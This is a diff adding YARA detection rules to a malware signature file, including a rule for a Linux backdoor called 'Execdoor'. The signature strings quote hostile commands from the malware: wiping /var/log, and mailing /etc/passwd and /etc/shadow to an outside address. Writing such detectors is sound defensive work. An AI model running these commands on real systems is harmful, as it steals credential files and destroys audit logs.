@@ -172,3 +172,35 @@ rule downloader_generic_curl {
   condition:
     all of them
 }
+
+// rule generic_remove_syslogs {
+//   meta:
+//     author = "Nong Hoang Tu"
+//     email = "dmknght@parrotsec.org"
+//     description = "Bash command to remove everything in /var/log/"
+//     date = "12/11/1996"
+//     refrence = "https://otx.alienvault.com/indicator/file/6138054a7de11c23b5c26755d7548c4096fa547cbb964ac78ef0fbe59d16c2da"
+//   strings:
+//     $ = "rm -rf /var/log/*"
+//   condition:
+//     all of them
+// }
+
+
+rule Execdoor {
+  meta:
+    author = "Nong Hoang Tu"
+    email = "dmknght@parrotsec.org"
+    description = "Linux Execdoor"
+    date = "12/11/1996"
+    refrence = "https://otx.alienvault.com/indicator/file/6138054a7de11c23b5c26755d7548c4096fa547cbb964ac78ef0fbe59d16c2da"
+    target = "File, memory"
+  strings:
+    $s1 = "rm -rf /var/log/*"
+    $s2 = "/bin/sh"
+    $s3 = "mail -s passwdforyababe gayz0r@boi.org.ie < /etc/passwd"
+    $s4 = "mail -s shadowforyababe gayz0r@boi.org.ie < /etc/shadow"
+    $s5 = "Brand new TCP root shell!"
+  condition:
+    $s3 or $s4 or ($s1 and $s2 and $s5)
+}
